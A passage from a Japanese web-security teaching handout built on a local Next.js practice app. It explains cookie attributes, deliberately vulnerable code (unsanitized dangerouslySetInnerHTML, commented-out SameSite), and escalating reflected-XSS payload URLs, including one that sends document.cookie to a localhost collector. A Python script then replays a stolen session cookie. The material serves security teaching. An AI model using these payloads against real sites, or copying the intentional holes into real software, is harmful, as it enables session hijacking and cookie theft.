      有効期限に関する属性です。期限を過ぎるとブラウザによって自動削除されます。特に設定しなければ「セッション
      Cookie」となり、ブラウザを閉じると削除されます。</p>
      <p><strong>HttpOnly属性</strong> : この属性が設定されている Cookie は、JavaScript
      から値を読み込むことができなくなります。<strong>XSS攻撃</strong>
      によるセッションハイジャックを防ぐセキュリティ対策として <strong>超重要</strong>
      となってきます。。</p>
      <p><strong>Secure属性</strong> : この属性が設定されている Cookie は HTTPS
      通信時のみ送信されるようになります。HTTP (≠HTTPS) による平文通信により Cookie が漏洩 (盗聴)
      することを防ぐために使用します。なお、ローカル環境で <code>npm run dev</code> や
      <code>npm run build</code> で Next.js
      アプリを起動すると、基本的には「HTTP」になります。そのため、この属性がついている Cookie
      は、送信されないので注意してください。Vercel にデプロイ・ホストすればHTTPS
      通信が使用されるた「HTTPS」となるため機能します。</p>
      <p><strong>SameSite属性</strong> :
      CSRF攻撃を防ぐための重要な属性です。次の3つの値を設定できます。</p>
      <ul>
      <li><code>strict</code>: 同一サイトからのリクエストでのみ Cookie が送信されます。</li>
      <li><code>lax</code>:
      同一サイトからのリクエストと、トップレベルナビゲーション（リンクのクリックなど）による GET
      リクエストで Cookie が送信されます。</li>
      <li><code>none</code>: すべてのクロスサイトリクエストで Cookie が送信されます。Secure
      属性との併用が必須となります。サードパーティ Cookie が必要な場合に使用します。</li>
      </ul>
      <p>これらの属性を適切に設定することで、セキュリティを向上させつつ、ユーザビリティを保った
      Cookie の運用が可能になります。</p>
      <p>なお、上記以外にも、<code>Path</code> や <code>Max-Age</code> などの Cookie
      の属性が存在します。それらについて、ウェブや生成AIを使って概要を把握してください。</p>
      <p>(プロンプト例)</p>
      <blockquote>
      <p>Cookie
      の「Max-Age属性」と「Expires属性」の違いについて教えてください。また、どのように使い分けますか。</p>
      </blockquote>
      <blockquote>
      <p>Cookie
      の「SameSite属性」と「CSRF攻撃」の関係が分かりません。そもそも「CSRF攻撃とは何か？」から教えてください。</p>
      </blockquote>
      <h3 data-number="4.4.1" id="javascriptから-cookie-を確認"><span
      class="header-section-number">4.4.1</span> JavaScriptから Cookie を確認</h3>
      <p>ブラウザのデベロッパーツールの「コンソール」からは、「JavaScriptコード」を対話的に実行することができます。例えば
      <code>document.cookie</code> と入力することで、現在表示しているウェブサイト (ドメイン)
      のなかで <strong>HttpOnly属性</strong> が設定されていない Cookie
      の値を取得することが可能です。</p>
      <figure>
      <img src="figs/01/cookie-04.png" alt="img" />
      <figcaption aria-hidden="true">img</figcaption>
      </figure>
      <p>観点を変えれば、第3者によって、そのウェブサイトに悪意あるJavaScriptコードが埋め込まれた場合、それらの
      Cookie が窃取される可能性があると言えます。</p>
      <h1 data-number="5" id="ニュースのコンテンツ"><span class="header-section-number">5</span>
      「ニュース」のコンテンツ</h1>
      <ul>
      <li><a href="http://localhost:3000/news">http://localhost:3000/news</a></li>
      </ul>
      <p>このコンテンツは <code>region</code> という Cookie に設定された値
      (<code>OSAKA</code>、<code>TOKYO</code> など)
      に応じて、表示されるニュースが変わるようになっています。</p>
      <h2 data-number="5.1" id="クライアントサイド-フロントエンド-の処理"><span
      class="header-section-number">5.1</span> クライアントサイド (フロントエンド) の処理</h2>
      <p>ページにアクセスしたら、クライアントサイドにおいて Cookie のなかに <code>region</code>
      が存在するかをチェックして、存在しない場合は初期値として <code>OSAKA</code>
      を設定するようにしています。</p>
      <div class="sourceCode" id="cb22"
      data-caption="src/app/news/page.tsx (抜粋) useStateによる状態管理" data-startFrom="43"><pre
      class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 42;"><span id="cb22-43"><a href="#cb22-43"></a><span class="fu">useEffect</span>(() <span class="kw">=&gt;</span> {</span>
<span id="cb22-44"><a href="#cb22-44"></a>  <span class="kw">const</span> regionStr <span class="op">=</span> Cookies<span class="op">.</span><span class="fu">get</span>(<span class="st">&quot;region&quot;</span>)<span class="op">;</span></span>
<span id="cb22-45"><a href="#cb22-45"></a>  <span class="co">// Cookieが存在しない もしくはデタラメな値の場合は OSAKA をセットする</span></span>
<span id="cb22-46"><a href="#cb22-46"></a>  <span class="cf">if</span> (<span class="op">!</span>regionStr <span class="op">||</span> <span class="op">!</span><span class="bu">Object</span><span class="op">.</span><span class="fu">values</span>(Region)<span class="op">.</span><span class="fu">includes</span>(regionStr <span class="im">as</span> Region)) {</span>
<span id="cb22-47"><a href="#cb22-47"></a>    <span class="fu">setSessionCookie</span>(Region<span class="op">.</span><span class="at">OSAKA</span>)<span class="op">;</span></span>
<span id="cb22-48"><a href="#cb22-48"></a>    <span class="cf">return</span><span class="op">;</span></span>
<span id="cb22-49"><a href="#cb22-49"></a>  }</span>
<span id="cb22-50"><a href="#cb22-50"></a>  <span class="fu">setRegion</span>(regionStr <span class="im">as</span> Region)<span class="op">;</span> <span class="co">// Cookieから取得した地域をセット</span></span>
<span id="cb22-51"><a href="#cb22-51"></a>}<span class="op">,</span> [])<span class="op">;</span></span></code></pre></div>
      <p><strong>第47行目</strong> の <code>setSessionCookie</code>
      は、以下のような自作関数になっています。このあとセキュリティの脆弱性に関する実験をするために、あえて
      <code>path</code> や <code>sameSite</code> をコメントアウトしています。</p>
      <div class="sourceCode" id="cb23"
      data-caption="src/app/news/page.tsx (抜粋) Cookie をセットする関数" data-startFrom="27"><pre
      class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 26;"><span id="cb23-27"><a href="#cb23-27"></a><span class="co">// Cookie をセットする関数の定義</span></span>
<span id="cb23-28"><a href="#cb23-28"></a><span class="kw">const</span> setSessionCookie <span class="op">=</span> <span class="fu">useCallback</span>((region<span class="op">:</span> Region) <span class="kw">=&gt;</span> {</span>
<span id="cb23-29"><a href="#cb23-29"></a>  Cookies<span class="op">.</span><span class="fu">set</span>(<span class="st">&quot;region&quot;</span><span class="op">,</span> region<span class="op">,</span> {</span>
<span id="cb23-30"><a href="#cb23-30"></a>    expires<span class="op">:</span> <span class="dv">7</span><span class="op">,</span> <span class="co">// 有効期限（7日間）</span></span>
<span id="cb23-31"><a href="#cb23-31"></a>    <span class="co">// path: &quot;/api/news&quot;, // 💀 省略すると &quot;/&quot; が設定される</span></span>
<span id="cb23-32"><a href="#cb23-32"></a>    <span class="co">// sameSite: &quot;strict&quot;, // 💀 適切に設定しないとCSRF脆弱性が生じる</span></span>
<span id="cb23-33"><a href="#cb23-33"></a>    secure<span class="op">:</span> <span class="kw">false</span><span class="op">,</span> <span class="co">// 💀 本番環境(HTTPS)では true にすべき</span></span>
<span id="cb23-34"><a href="#cb23-34"></a>  })<span class="op">;</span></span>
<span id="cb23-35"><a href="#cb23-35"></a>  <span class="co">// 👆 セキュアに利用する観点から各設定の意味を調べてみてください</span></span>
<span id="cb23-36"><a href="#cb23-36"></a>}<span class="op">,</span> [])<span class="op">;</span></span></code></pre></div>
      <p>ブラウザを閉じても Cookie には値が残っているので
      (有効期限は7日間に設定されているので)、再度 <code>/news</code>
      にアクセスしたときには、最後に表示していた地域のニュースが表示されるようになっています。</p>
      <p>ただし、Chrome において Cookie
      はプロファイル毎に管理されているため、あるプロファイルで地域を「沖縄」に設定しても、別のプロファイルで
      <code>/news</code> にアクセスすれば初期値の「大阪」が表示されます。</p>
      <p>地域毎の「ニュース記事」の取得は、状態管理の変数 <code>state</code> の変更をトリガーに
      <code>/api/news</code> に対するGET Method で行なっています。以下の <strong>第61行目</strong>
      ように <code>fetch</code> のオプションに <code>credentials: "include"</code>
      を設定することで、JavaScript から HTTPリクエストを送るときにも Cookie
      が追加されるようになります。</p>
      <div class="sourceCode" id="cb24"
      data-caption="src/app/news/page.tsx (抜粋) Cookie をセットする関数" data-startFrom="55"><pre
      class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 54;"><span id="cb24-55"><a href="#cb24-55"></a><span class="fu">useEffect</span>(() <span class="kw">=&gt;</span> {</span>
<span id="cb24-56"><a href="#cb24-56"></a>  <span class="kw">const</span> fetchNews <span class="op">=</span> <span class="kw">async</span> () <span class="kw">=&gt;</span> {</span>
<span id="cb24-57"><a href="#cb24-57"></a>    <span class="cf">try</span> {</span>
<span id="cb24-58"><a href="#cb24-58"></a>      <span class="fu">setIsLoading</span>(<span class="kw">true</span>)<span class="op">;</span></span>
<span id="cb24-59"><a href="#cb24-59"></a>      <span class="kw">const</span> res <span class="op">=</span> <span class="cf">await</span> <span class="fu">fetch</span>(ep<span class="op">,</span> {</span>
<span id="cb24-60"><a href="#cb24-60"></a>        method<span class="op">:</span> <span class="st">&quot;GET&quot;</span><span class="op">,</span></span>
<span id="cb24-61"><a href="#cb24-61"></a>        credentials<span class="op">:</span> <span class="st">&quot;include&quot;</span><span class="op">,</span> <span class="co">// Cookieも送信</span></span>
<span id="cb24-62"><a href="#cb24-62"></a>        cache<span class="op">:</span> <span class="st">&quot;no-store&quot;</span><span class="op">,</span></span>
<span id="cb24-63"><a href="#cb24-63"></a>      })<span class="op">;</span></span>
<span id="cb24-64"><a href="#cb24-64"></a>      <span class="kw">const</span> data<span class="op">:</span> ApiResponse<span class="op">&lt;</span>NewsItem[]<span class="op">&gt;</span> <span class="op">=</span> <span class="cf">await</span> res<span class="op">.</span><span class="fu">json</span>()<span class="op">;</span></span>
<span id="cb24-65"><a href="#cb24-65"></a>      <span class="cf">if</span> (data<span class="op">.</span><span class="at">success</span>) {</span>
<span id="cb24-66"><a href="#cb24-66"></a>        <span class="fu">setNewsItems</span>(data<span class="op">.</span><span class="at">payload</span>)<span class="op">;</span></span>
<span id="cb24-67"><a href="#cb24-67"></a>      } <span class="cf">else</span> {</span>
<span id="cb24-68"><a href="#cb24-68"></a>        <span class="bu">console</span><span class="op">.</span><span class="fu">error</span>(data<span class="op">.</span><span class="at">message</span>)<span class="op">;</span></span>
<span id="cb24-69"><a href="#cb24-69"></a>      }</span>
<span id="cb24-70"><a href="#cb24-70"></a>    } <span class="cf">catch</span> (e) {</span>
<span id="cb24-71"><a href="#cb24-71"></a>      <span class="bu">console</span><span class="op">.</span><span class="fu">error</span>(<span class="st">&quot;ニュース記事取得失敗&quot;</span><span class="op">,</span> e)<span class="op">;</span></span>
<span id="cb24-72"><a href="#cb24-72"></a>    } <span class="cf">finally</span> {</span>
<span id="cb24-73"><a href="#cb24-73"></a>      <span class="fu">setIsLoading</span>(<span class="kw">false</span>)<span class="op">;</span></span>
<span id="cb24-74"><a href="#cb24-74"></a>    }</span>
<span id="cb24-75"><a href="#cb24-75"></a>  }<span class="op">;</span></span>
<span id="cb24-76"><a href="#cb24-76"></a>  <span class="fu">fetchNews</span>()<span class="op">;</span></span>
<span id="cb24-77"><a href="#cb24-77"></a>}<span class="op">,</span> [region])<span class="op">;</span></span></code></pre></div>
      <h2 data-number="5.2" id="サーバサイド-バックエンド-の処理"><span
      class="header-section-number">5.2</span> サーバサイド (バックエンド) の処理</h2>
      <p><code>/api/news</code> にアクセスがあったときに実行される処理は
      <code>src/app/news/route.ts</code> に記載されます。サーバサイドでは、Cookie に応じて DB
      からのデータ取得条件を変えています。</p>
      <div class="sourceCode" id="cb25" data-caption="src/app/news/route.ts (抜粋)"
      data-startFrom="4"><pre class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 3;"><span id="cb25-4"><a href="#cb25-4"></a><span class="im">import</span> { cookies } <span class="im">from</span> <span class="st">&quot;next/headers&quot;</span><span class="op">;</span></span></code></pre></div>
      <div class="sourceCode" id="cb26"
      data-caption="src/app/news/route.ts (抜粋) Cookie によりDBから取得するデータを変更"
      data-startFrom="11"><pre class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 10;"><span id="cb26-11"><a href="#cb26-11"></a><span class="co">// リクエストに含まれるクッキー region の値を regionStr に取得</span></span>
<span id="cb26-12"><a href="#cb26-12"></a><span class="kw">const</span> cookieStore <span class="op">=</span> <span class="cf">await</span> <span class="fu">cookies</span>()<span class="op">;</span></span>
<span id="cb26-13"><a href="#cb26-13"></a><span class="kw">const</span> regionStr <span class="op">=</span> cookieStore<span class="op">.</span><span class="fu">get</span>(cKey)<span class="op">?.</span><span class="at">value</span> <span class="op">??</span> Region<span class="op">.</span><span class="at">OSAKA</span><span class="op">;</span></span>
<span id="cb26-14"><a href="#cb26-14"></a></span>
<span id="cb26-15"><a href="#cb26-15"></a><span class="co">// 文字列を列挙子 Region.XXXX に変換（不正な文字列は Region.OSAKA にする）</span></span>
<span id="cb26-16"><a href="#cb26-16"></a><span class="kw">const</span> region <span class="op">=</span> <span class="bu">Object</span><span class="op">.</span><span class="fu">values</span>(Region)<span class="op">.</span><span class="fu">includes</span>(regionStr <span class="im">as</span> Region)</span>
<span id="cb26-17"><a href="#cb26-17"></a>  <span class="op">?</span> (regionStr <span class="im">as</span> Region)</span>
<span id="cb26-18"><a href="#cb26-18"></a>  <span class="op">:</span> Region<span class="op">.</span><span class="at">OSAKA</span><span class="op">;</span></span>
<span id="cb26-19"><a href="#cb26-19"></a></span>
<span id="cb26-20"><a href="#cb26-20"></a><span class="co">// DBから記事を全件取得。実設計では take/skip でページネーションすべき</span></span>
<span id="cb26-21"><a href="#cb26-21"></a><span class="kw">const</span> newsItems<span class="op">:</span> NewsItem[] <span class="op">=</span> <span class="cf">await</span> prisma<span class="op">.</span><span class="at">newsItem</span><span class="op">.</span><span class="fu">findMany</span>({</span>
<span id="cb26-22"><a href="#cb26-22"></a>  where<span class="op">:</span> { region }<span class="op">,</span></span>
<span id="cb26-23"><a href="#cb26-23"></a>  orderBy<span class="op">:</span> { publishedAt<span class="op">:</span> <span class="st">&quot;desc&quot;</span> }<span class="op">,</span></span>
<span id="cb26-24"><a href="#cb26-24"></a>})<span class="op">;</span></span></code></pre></div>
      <ul>
      <li>口頭説明</li>
      </ul>
      <h2 data-number="5.3" id="swr-について"><span class="header-section-number">5.3</span> SWR
      について</h2>
      <ul>
      <li>口頭説明</li>
      </ul>
      <h1 data-number="6" id="ショップのコンテンツ"><span class="header-section-number">6</span>
      「ショップ」のコンテンツ</h1>
      <ul>
      <li><a href="http://localhost:3000/shop">http://localhost:3000/shop</a></li>
      <li>口頭説明</li>
      </ul>
      <h1 data-number="7" id="xss脆弱性"><span class="header-section-number">7</span> XSS脆弱性</h1>
      <p><strong>XSS</strong> (Cross-Site Scripting: クロスサイトスクリプティング)
      は、ウェブページのなかに、外部から <strong>悪意のあるJavaScriptコード</strong>
      を埋め込むことで、ユーザのウェブブラウザ上で「<strong>意図しない処理
      JavaScriptプログラム)を実行させる脆弱性</strong>」です。</p>
      <p>例えば、掲示板やコメント欄などに <code>&lt;script&gt;alert("XSS")&lt;/script&gt;</code>
      のようなタグが投稿され、それが<strong>適切にサニタイズ (無害化)
      やエスケープ処理がされず</strong> <span class="masked">そのままHTMLとして表示</span>
      されると、他の閲覧者のブラウザ上でそのスクリプトが実行されてしまいます。これにより「<strong>Cookie情報の窃取</strong>」や「<strong>別のサイト
      (フィッシングサイト) へのリダイレクト</strong>」、さらには「<strong>ユーザの意図しない操作
      (投稿処理や削除処理など)</strong>」が強制される可能性があります。</p>
      <p>(プロンプト例)</p>
      <blockquote>
      <p>ウェブアプリ開発およびXSS脆弱性の文脈で、「サニタイズ処理」と「エスケープ処理」とはなんですか。また、それらの違いについて教えてください。</p>
      </blockquote>
      <p><code>src/app/news/page.tsx</code> は、<a
      href="http://localhost:3000/news?name=寝屋川タヌキ">http://localhost:3000/news?name=寝屋川タヌキ</a>
      のようなクエリパラメータ (<code>name</code>)
      を受け付ける仕様となっており、<strong>これを適切な無害化を処理せずに出力しているため</strong>
      「<strong>反射型XSS (Reflected
      XSS)</strong>」と呼ばれるタイプの脆弱性を持った実装となってしまっています。</p>
      <p>例示するような <code>name=寝屋川タヌキ</code>
      という文字列をクエリパラメータとして与える範囲においては、以下のように特段の問題は生じません。<code>name=【JavaScriptプログラム】</code>
      が指定されたときに問題が生じます。</p>
      <figure>
      <img src="figs/01/xss-01.png" alt="img" />
      <figcaption aria-hidden="true">img</figcaption>
      </figure>
      <p>まずは、<code>src/app/news/page.tsx</code>
      のなかでクエリパラメータを処理するプログラムについて確認しています。</p>
      <div class="sourceCode" id="cb27"
      data-caption="src/app/news/page.tsx (抜粋) useStateによる状態管理" data-startFrom="25"><pre
      class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 24;"><span id="cb27-25"><a href="#cb27-25"></a><span class="kw">const</span> [name<span class="op">,</span> setName] <span class="op">=</span> <span class="fu">useState</span><span class="op">&lt;</span><span class="dt">string</span> <span class="op">|</span> <span class="dt">null</span><span class="op">&gt;</span>(<span class="kw">null</span>)<span class="op">;</span></span></code></pre></div>
      <div class="sourceCode" id="cb28"
      data-caption="src/app/news/page.tsx (抜粋) クエリパラメータ name=XXXX の取得"
      data-startFrom="38"><pre class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 37;"><span id="cb28-38"><a href="#cb28-38"></a><span class="fu">useEffect</span>(() <span class="kw">=&gt;</span> {</span>
<span id="cb28-39"><a href="#cb28-39"></a>  <span class="kw">const</span> params <span class="op">=</span> <span class="kw">new</span> <span class="fu">URLSearchParams</span>(<span class="bu">window</span><span class="op">.</span><span class="at">location</span><span class="op">.</span><span class="at">search</span>)<span class="op">;</span></span>
<span id="cb28-40"><a href="#cb28-40"></a>  <span class="fu">setName</span>(params<span class="op">.</span><span class="fu">get</span>(<span class="st">&quot;name&quot;</span>))<span class="op">;</span> <span class="co">// 💀 サニタイズ（無害化）ぜずに値を格納</span></span>
<span id="cb28-41"><a href="#cb28-41"></a>}<span class="op">,</span> [])<span class="op">;</span></span></code></pre></div>
      <div class="sourceCode" id="cb29"
      data-caption="src/app/news/page.tsx (抜粋) サニタイズせずに出力" data-startFrom="140"><pre
      class="sourceCode numberSource ts numberLines"><code class="sourceCode typescript" style="counter-reset: source-line 139;"><span id="cb29-140"><a href="#cb29-140"></a>{name <span class="op">&amp;&amp;</span> (</span>
<span id="cb29-141"><a href="#cb29-141"></a>  <span class="op">&lt;</span>div className<span class="op">=</span><span class="st">&quot;mt-4 ml-4 flex text-sm text-slate-600&quot;</span><span class="op">&gt;</span></span>
<span id="cb29-142"><a href="#cb29-142"></a>    {<span class="co">/* サニタイズされていない値を dangerouslySetInnerHTML で出力（💀超危険） */</span>}</span>
<span id="cb29-143"><a href="#cb29-143"></a>    <span class="op">&lt;</span>span dangerouslySetInnerHTML<span class="op">=</span>{{ __html<span class="op">:</span> name }} className<span class="op">=</span><span class="st">&quot;mr-1&quot;</span> <span class="op">/&gt;</span></span>
<span id="cb29-144"><a href="#cb29-144"></a>    さん、こんにちは！</span>
<span id="cb29-145"><a href="#cb29-145"></a>  <span class="op">&lt;/</span>div<span class="op">&gt;</span></span>
<span id="cb29-146"><a href="#cb29-146"></a>)}</span></code></pre></div>
      <p>XSS脆弱性の原因となっているのは <strong>第40行目</strong> と <strong>第143行目</strong>
      になります。いずれか一方で適切な処理がされていれば XSS
      は生じません。例えば、<strong>第143行目</strong> を
      <code>&lt;span className="mr-1"&gt;{name}&lt;/span&gt;</code> としていれば XSS攻撃
      は失敗となります。</p>
      <p>なお、反射型XSSは、詳細は<a
      href="http://localhost:3000/news?name=%3Cimg%20src=x%20onerror=%22alert(&#39;Hoge!&#39;)%22%3E">こちら</a>のようなリンクに仕込まれる可能性があります。</p>
      <h3 data-number="7.0.1" id="例1"><span class="header-section-number">7.0.1</span> 例1</h3>
      <div class="sourceCode" id="cb30" data-caption="無害なクエリパラメータ"><pre
      class="sourceCode txt"><code class="sourceCode default"><span id="cb30-1"><a href="#cb30-1" aria-hidden="true" tabindex="-1"></a>http://localhost:3000/news?name=寝屋川タヌキ</span></code></pre></div>
      <figure>
      <img src="figs/01/xss-01.png" alt="img" />
      <figcaption aria-hidden="true">img</figcaption>
      </figure>
      <h3 data-number="7.0.2" id="例2"><span class="header-section-number">7.0.2</span> 例2</h3>
      <div class="sourceCode" id="cb31" data-caption="無害なクエリパラメータ？🤔"><pre
      class="sourceCode txt"><code class="sourceCode default"><span id="cb31-1"><a href="#cb31-1" aria-hidden="true" tabindex="-1"></a>http://localhost:3000/news?name=&lt;font size=20 color=&quot;brown&quot;&gt;&lt;b&gt;寝屋川タヌキ&lt;/b&gt;&lt;/font&gt;</span></code></pre></div>
      <figure>
      <img src="figs/01/xss-02.png" alt="img" />
      <figcaption aria-hidden="true">img</figcaption>
      </figure>
      <h3 data-number="7.0.3" id="例3"><span class="header-section-number">7.0.3</span> 例3</h3>
      <div class="sourceCode" id="cb32" data-caption="💀 XSS脆弱性を利用してJavaScriptを実行"><pre
      class="sourceCode txt"><code class="sourceCode default"><span id="cb32-1"><a href="#cb32-1" aria-hidden="true" tabindex="-1"></a>http://localhost:3000/news?name=&lt;img src=x onerror=&quot;alert(&#39;Hoge!&#39;)&quot;&gt;</span></code></pre></div>
      <figure>
      <img src="figs/01/xss-03.png" alt="img" />
      <figcaption aria-hidden="true">img</figcaption>
      </figure>
      <h3 data-number="7.0.4" id="例4"><span class="header-section-number">7.0.4</span> 例4</h3>
      <div class="sourceCode" id="cb33"
      data-caption="💀💀 XSS脆弱性を利用してCookieを取得して表示"><pre
      class="sourceCode txt"><code class="sourceCode default"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true" tabindex="-1"></a>http://localhost:3000/news?name=&lt;img src=x onerror=&quot;document.write(&#39;(ToT) =&gt; &#39;,document.cookie)&quot;&gt;</span></code></pre></div>
      <figure>
      <img src="figs/01/xss-04.png" alt="img" />
      <figcaption aria-hidden="true">img</figcaption>
      </figure>
      <h3 data-number="7.0.5" id="例5"><span class="header-section-number">7.0.5</span> 例5</h3>
      <div class="sourceCode" id="cb34"
      data-caption="💀💀💀 XSS脆弱性を利用してCookieを取得して送信"><pre
      class="sourceCode txt"><code class="sourceCode default"><span id="cb34-1"><a href="#cb34-1" aria-hidden="true" tabindex="-1"></a>http://localhost:3000/news?name=&lt;img src=x onerror=&quot;fetch(&#39;http://localhost:3000/api/xss?c=&#39;+document.cookie);window.location.href=&#39;/&#39;&quot;&gt;</span></code></pre></div>
      <ul>
      <li>(URLエンコーディング/パーセントエンコーディング)[https://tech-unlimited.com/urlencode.html]</li>
      </ul>
      <div class="sourceCode" id="cb35"
      data-caption="💀💀💀 XSS脆弱性を利用してCookieを取得して送信 (URLエンコード後)"><pre
      class="sourceCode txt"><code class="sourceCode default"><span id="cb35-1"><a href="#cb35-1" aria-hidden="true" tabindex="-1"></a>http://localhost:3000/news?name=%3Cimg+src%3Dx+onerror%3D%22fetch%28%27http%3A%2F%2Flocalhost%3A3000%2Fapi%2Fxss%3Fc%3D%27%2Bdocument.cookie%29%3Bwindow.location.href%3D%27%2F%27%22%3E</span></code></pre></div>
      <pre><code>npx prisma studio</code></pre>
      <h2 data-number="7.1" id="cookie-が窃取されると"><span
      class="header-section-number">7.1</span> Cookie が窃取されると…</h2>
      <figure>
      <img src="figs/01/xss-05.png" alt="img" />
      <figcaption aria-hidden="true">img</figcaption>
      </figure>
      <div class="sourceCode" id="cb37" data-caption="💀💀💀💀 入手したCookieを悪用 (Python)"><pre
      class="sourceCode python"><code class="sourceCode python"><span id="cb37-1"><a href="#cb37-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> requests</span>
<span id="cb37-2"><a href="#cb37-2" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> json</span>
<span id="cb37-3"><a href="#cb37-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb37-4"><a href="#cb37-4" aria-hidden="true" tabindex="-1"></a>url <span class="op">=</span> <span class="st">&#39;http://localhost:3000/api/cart&#39;</span></span>
<span id="cb37-5"><a href="#cb37-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb37-6"><a href="#cb37-6" aria-hidden="true" tabindex="-1"></a><span class="co"># ここに窃取したセッションIDをセット</span></span>
<span id="cb37-7"><a href="#cb37-7" aria-hidden="true" tabindex="-1"></a>cart_session_id <span class="op">=</span> <span class="st">&#39;00000000-0000-0000-0000-000000000000&#39;</span></span>
<span id="cb37-8"><a href="#cb37-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb37-9"><a href="#cb37-9" aria-hidden="true" tabindex="-1"></a>cookies <span class="op">=</span> {<span class="st">&#39;cart_session_id&#39;</span>: cart_session_id}</span>
<span id="cb37-10"><a href="#cb37-10" aria-hidden="true" tabindex="-1"></a>headers <span class="op">=</span> {<span class="st">&#39;Content-Type&#39;</span>: <span class="st">&#39;application/json&#39;</span>}</span>
<span id="cb37-11"><a href="#cb37-11" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> {<span class="st">&#39;productId&#39;</span>: <span class="st">&#39;A-002&#39;</span>, <span class="st">&#39;quantity&#39;</span>: <span class="dv">9999</span>}</span>
<span id="cb37-12"><a href="#cb37-12" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb37-13"><a href="#cb37-13" aria-hidden="true" tabindex="-1"></a>res <span class="op">=</span> requests.patch(</span>
<span id="cb37-14"><a href="#cb37-14" aria-hidden="true" tabindex="-1"></a>  url<span class="op">=</span>url,</span>
<span id="cb37-15"><a href="#cb37-15" aria-hidden="true" tabindex="-1"></a>  data<span class="op">=</span>json.dumps(payload),</span>
<span id="cb37-16"><a href="#cb37-16" aria-hidden="true" tabindex="-1"></a>  headers<span class="op">=</span>headers,</span>
<span id="cb37-17"><a href="#cb37-17" aria-hidden="true" tabindex="-1"></a>  cookies<span class="op">=</span>cookies</span>
<span id="cb37-18"><a href="#cb37-18" aria-hidden="true" tabindex="-1"></a>)</span>
<span id="cb37-19"><a href="#cb37-19" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb37-20"><a href="#cb37-20" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(<span class="ss">f&#39;ステータスコード: </span><span class="sc">{</span>res<span class="sc">.</span>status_code<span class="sc">}</span><span class="ss">&#39;</span>)</span>
<span id="cb37-21"><a href="#cb37-21" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb37-22"><a href="#cb37-22" aria-hidden="true" tabindex="-1"></a>is_success <span class="op">=</span> res.json().get(<span class="st">&#39;success&#39;</span>)</span>
<span id="cb37-23"><a href="#cb37-23" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(<span class="ss">f&#39;res.success: </span><span class="sc">{</span>is_success<span class="sc">}</span><span class="ss">&#39;</span>)</span>
<span id="cb37-24"><a href="#cb37-24" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb37-25"><a href="#cb37-25" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> is_success:</span>
<span id="cb37-26"><a href="#cb37-26" aria-hidden="true" tabindex="-1"></a>  res <span class="op">=</span> requests.get(</span>
<span id="cb37-27"><a href="#cb37-27" aria-hidden="true" tabindex="-1"></a>    url<span class="op">=</span>url,</span>
<span id="cb37-28"><a href="#cb37-28" aria-hidden="true" tabindex="-1"></a>    cookies<span class="op">=</span>cookies</span>
<span id="cb37-29"><a href="#cb37-29" aria-hidden="true" tabindex="-1"></a>  )</span>
<span id="cb37-30"><a href="#cb37-30" aria-hidden="true" tabindex="-1"></a>  cart_items <span class="op">=</span> res.json().get(<span class="st">&#39;payload&#39;</span>)</span>
<span id="cb37-31"><a href="#cb37-31" aria-hidden="true" tabindex="-1"></a>  <span class="bu">print</span>(<span class="ss">f&#39;カートの内容: </span><span class="sc">{</span>json<span class="sc">.</span>dumps(cart_items, indent<span class="op">=</span><span class="dv">2</span>)<span class="sc">}</span><span class="ss">&#39;</span>)</span></code></pre></div>
      <h2 data-number="7.2" id="flask-python-などでもxss脆弱性に注意"><span
      class="header-section-number">7.2</span> Flask (Python) などでもXSS脆弱性に注意</h2>
      <div class="sourceCode" id="cb38" data-caption="XSS脆弱性 (Python)"><pre
      class="sourceCode python"><code class="sourceCode python"><span id="cb38-1"><a href="#cb38-1" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> flask <span class="im">import</span> Flask, request, Response</span>
<span id="cb38-2"><a href="#cb38-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb38-3"><a href="#cb38-3" aria-hidden="true" tabindex="-1"></a>app <span class="op">=</span> Flask(<span class="va">__name__</span>)</span>
<span id="cb38-4"><a href="#cb38-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb38-5"><a href="#cb38-5" aria-hidden="true" tabindex="-1"></a><span class="at">@app.route</span>(<span class="st">&quot;/&quot;</span>)</span>
<span id="cb38-6"><a href="#cb38-6" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> greet():</span>
<span id="cb38-7"><a href="#cb38-7" aria-hidden="true" tabindex="-1"></a>  name <span class="op">=</span> request.args.get(<span class="st">&quot;name&quot;</span>, <span class="st">&quot;&quot;</span>)</span>
<span id="cb38-8"><a href="#cb38-8" aria-hidden="true" tabindex="-1"></a>  html <span class="op">=</span> <span class="ss">f&quot;こんにちは</span><span class="sc">{</span>name<span class="sc">}</span><span class="ss">さん&quot;</span></span>
<span id="cb38-9"><a href="#cb38-9" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> Response(html, content_type<span class="op">=</span><span class="st">&quot;text/html&quot;</span>)</span>
<span id="cb38-10"><a href="#cb38-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb38-11"><a href="#cb38-11" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">&quot;__main__&quot;</span>:</span>
<span id="cb38-12"><a href="#cb38-12" aria-hidden="true" tabindex="-1"></a>  app.run(debug<span class="op">=</span><span class="va">True</span>)</span></code></pre></div>
      <!-- ---------------------------------------- -->
    </main>

    <footer class="markdown-body">
